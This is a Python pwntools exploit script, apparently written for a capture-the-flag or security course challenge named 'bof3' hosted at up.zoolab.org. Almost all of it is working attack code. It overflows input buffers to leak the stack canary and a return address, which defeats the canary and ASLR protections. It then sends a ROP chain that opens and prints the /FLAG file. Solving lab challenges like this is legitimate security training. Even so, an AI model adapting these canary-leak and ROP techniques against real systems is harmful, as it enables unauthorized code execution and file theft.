#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys
import re
import time

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 12344

FLAG_PATTERN = r"FLAG\{.*?\}"

elf = ELF(exe)
off_main = elf.symbols.get(b'main', 0)
base = 0
qemu_base = 0


r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

# buf1:     0x7fffffffe260 # Leak Canary
# buf2:     0x7fffffffe290 # Leak Addr
# buf3:     0x7fffffffe2c0 # Overwrite rip
# msg:      0x7fffffffe2f0
# ret_addr: 0x7fffffffe328

# Step 1: Leak Canary
r.recvuntil(b"What's your name? ")
payloads = b'A'*185
r.send(payloads)

r.recvuntil(b'Welcome, ')
r.recvuntil(payloads)

canary = u64(r.recv(7).rjust(8, b'\x00'))
r.recv(1024)

# Step 2: Leak Addr
r.recvuntil(b"What's the room number? ")
payloads = b'B'*152
r.send(payloads)

res = r.recvline()

ret_addr = u64(res.split(b'B'*152)[1][:-1].ljust(8, b'\x00'))

main_offset = elf.symbols['main']
base_addr = ret_addr - 0x8A - main_offset

elf.address = base_addr

r.recvuntil(b"What's the customer's name? ")

rop = ROP(elf)

flag_path_addr = elf.bss() + 0x200
read_buffer_addr = flag_path_addr + 0x20

# ROP Chain
rop.read(0, flag_path_addr, 8)
rop.open(flag_path_addr, 0)
rop.read(3, read_buffer_addr, 100)
rop.write(1, read_buffer_addr, 100)
rop.exit(0)

rop_chain_bytes = rop.chain()

padding = u64(b'C'*8)

payloads = b'D' * 40 + p64(canary) + p64(padding) + rop_chain_bytes

r.sendline(b'Chloe')

r.recvuntil(b"Leave your message: ")
r.send(payloads)

time.sleep(1)
r.send(b"/FLAG\0\0\0")

res = r.recvall()
response = res.decode(errors='ignore')
flag_match = re.search(FLAG_PATTERN, response)

if flag_match:
    log.success(f"FLAG FOUND: {flag_match.group(0)}")
else:
    log.failure(f"FLAG NOT FOUND: No No No...")

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :